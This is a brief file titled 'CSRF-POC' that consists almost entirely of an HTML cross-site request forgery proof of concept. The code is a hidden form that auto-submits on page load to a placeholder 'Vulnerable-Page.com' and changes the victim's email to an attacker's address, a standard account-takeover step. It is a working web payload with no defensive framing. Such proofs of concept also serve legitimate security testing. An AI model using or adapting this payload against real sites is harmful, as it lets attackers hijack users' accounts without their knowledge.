# CSRF-POC

```
<html>
  <!-- CSRF PoC - Generated by Ahmed Hamdy - GenTiL Security -->
  <body>
    <form action="https://Vulnerable-Page.com/" method="POST">
      <input type="hidden" name="email" value="attacker-email@gmail.com" />
      <input type="hidden" name="csrf" value="hzj5YnAusINYO7bT2ouNrlRlzDhQFaSu" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
